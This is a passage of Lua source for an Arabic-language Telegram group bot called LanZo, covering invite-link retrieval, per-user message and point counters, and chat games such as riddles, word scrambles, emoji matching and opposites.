return false 
end 
DevaMeR:del(LanZo.."aMeR:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevaMeR:set(LanZo.."DevText", DevText)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ كليشة المطور", 1, "md")
end
if DevaMeR:get(LanZo..'aMeR:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevaMeR:del(LanZo..'aMeR:NameBot'..msg.sender_user_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ اسم البوت ', 1, 'html')
DevaMeR:del(LanZo..'aMeR:NameBot'..msg.sender_user_id_)
DevaMeR:set(LanZo..'aMeR:NameBot', text)
return false 
end
--     Source LanZo     --
if text == "الرابط" then
if not DevaMeR:get(LanZo..'aMeR:Lock:GpLinks'..msg.chat_id_) then 
if DevaMeR:get(LanZo.."aMeR:Groups:Links"..msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevaMeR:get(LanZo.."aMeR:Groups:Links"..msg.chat_id_), 1, "html")
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
end
else
end
end
--     Source LanZo     --
if text == "الرابط" then
if not DevaMeR:get(LanZo.."aMeR:Lock:GpLinksinline"..msg.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevaMeR:get(LanZo.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local Text = '᥀︙𝖫𝗂𝗇𝗄 𝖦𝗋𝗈𝗎𝗉 ↬ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n['..ta.title_..']('..linkgpp.result..')'
keyboard = {}  
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/X6UX6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else 
end 
end,nil) 
end
end
--     Source LanZo     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevaMeR:incr(LanZo..'aMeR:UsersMsgs'..LanZo..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevaMeR:incr(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevaMeR:incr(LanZo..'aMeR:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevaMeR:sismember(LanZo.."aMeR:Users",msg.chat_id_) then
DevaMeR:sadd(LanZo.."aMeR:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source LanZo     --
if ChatType == 'sp' or ChatType == 'gp' or ChatType == 'pv' then
if text == 'بوت' or text == 'بوتت' then 
NameBot = (DevaMeR:get(LanZo..'aMeR:NameBot') or 'لانزو')
local LanZoTeam = {' كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' ',' اسمي القميل '..NameBot..' '}
DevaMeR2 = math.random(#LanZoTeam) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam[DevaMeR2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevaMeR:get(LanZo..'aMeR:NameBot') or 'لانزو') 
local LanZoTeam = {"اسمي القميل "..NameBot.." "} 
DevaMeR2 = math.random(#LanZoTeam) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, LanZoTeam[DevaMeR2] , 1, 'html') 
return false
end
if text and text == (DevaMeR:get(LanZo..'aMeR:NameBot') or 'لانزو') then 
NameBot = (DevaMeR:get(LanZo..'aMeR:NameBot') or 'لانزو')
local namebot = {'كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' '} 
name = math.random(#namebot) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'html') 
return false 
end
if text =='نقاطي' and ChCheck(msg) then 
if tonumber((DevaMeR:get(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙لم تربح اي نقطه\n᥀︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_aMeR(msg.chat_id_, msg.id_, 1,'᥀︙عدد النقاط التي ربحتها ↫ '..(DevaMeR:get(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevaMeR:del(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevaMeR:del(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع نقاطك', 1, 'md') end
--     Source LanZo     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevaMeR2[math.random(#DevaMeR2)]
DevaMeR:set(LanZo..'aMeR:GameNum'..msg.chat_id_,name)
DevaMeR:del(LanZo..'aMeR:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
LanZoTeam = '᥀︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
return false
end end
if text == DevaMeR:get(LanZo..'aMeR:GameNum'..msg.chat_id_) and not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then 
LanZoTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevaMeR:set(LanZo..'aMeR:Games:Ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and ChCheck(msg) or text == 'الترتيب' and ChCheck(msg) or text == '↫ ترتيب ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevaMeR2[math.random(#DevaMeR2)]
DevaMeR:set(LanZo..'aMeR:GameNum'..msg.chat_id_,name)
DevaMeR:del(LanZo..'aMeR:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
LanZoTeam = '᥀︙اول واحد يرتبها يربح ↫ '..name
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
return false
end end
if text == DevaMeR:get(LanZo..'aMeR:GameNum'..msg.chat_id_) and not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then 
LanZoTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ ترتيب للعب مره اخرى'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevaMeR:set(LanZo..'aMeR:Games:Ids'..msg.chat_id_,true)
end
if text == 'محيبس' and ChCheck(msg) or text == 'بات' and ChCheck(msg) or text == 'المحيبس' and ChCheck(msg) or text == '↫ محيبس ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevaMeR:set(LanZo.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
᥀︙اختر رقم لاستخراج المحيبس
᥀︙الفائز يحصل على (5) نقاط
]]
Dev_aMeR(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevaMeR:setex(LanZo.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and ChCheck(msg) or text == 'الحزوره' and ChCheck(msg) or text == '↫ حزوره ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevaMeR2[math.random(#DevaMeR2)]
DevaMeR:set(LanZo..'aMeR:GameNum'..msg.chat_id_,name)
DevaMeR:del(LanZo..'aMeR:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
LanZoTeam = '᥀︙اول واحد يحلها يربح ↫ '..name
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
return false
end end
if text == DevaMeR:get(LanZo..'aMeR:GameNum'..msg.chat_id_) and not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then 
LanZoTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ حزوره للعب مره اخرى'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevaMeR:set(LanZo..'aMeR:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المعاني' and ChCheck(msg) or text == 'معاني' and ChCheck(msg) or text == '↫ معاني ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevaMeR2[math.random(#DevaMeR2)]
DevaMeR:set(LanZo..'aMeR:GameNum2'..msg.chat_id_,name)
DevaMeR:del(LanZo..'aMeR:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
LanZoTeam = '᥀︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
return false
end end
if text == DevaMeR:get(LanZo..'aMeR:GameNum2'..msg.chat_id_) and not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then 
LanZoTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ المعاني للعب مره اخرى'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevaMeR:set(LanZo..'aMeR:Games:Ids'..msg.chat_id_,true)
end 
if text == 'العكس' and ChCheck(msg) or text == 'عكس' and ChCheck(msg) or text == '↫ العكس ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevaMeR2[math.random(#DevaMeR2)]
DevaMeR:set(LanZo..'aMeR:GameNum3'..msg.chat_id_,name)
DevaMeR:del(LanZo..'aMeR:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
LanZoTeam = '᥀︙ما هو عكس كلمة ↫ '..name
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
return false
end end
if text == DevaMeR:get(LanZo..'aMeR:GameNum3'..msg.chat_id_) and not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then
if not DevaMeR:get(LanZo..'aMeR:Games:Ids'..msg.chat_id_) then 
LanZoTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ العكس للعب مره اخرى'
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md')
DevaMeR:incrby(LanZo..'aMeR:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevaMeR:set(LanZo..'aMeR:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المختلف' and ChCheck(msg) or text == 'مختلف' and ChCheck(msg) or text == '↫ المختلف ᥀' and ChCheck(msg) then
if not DevaMeR:get(LanZo..'aMeR:Lock:Games'..msg.chat_id_) then
DevaMeR2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevaMeR2[math.random(#DevaMeR2)]
DevaMeR:set(LanZo..'aMeR:GameNum4'..msg.chat_id_,name)
DevaMeR:del(LanZo..'aMeR:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
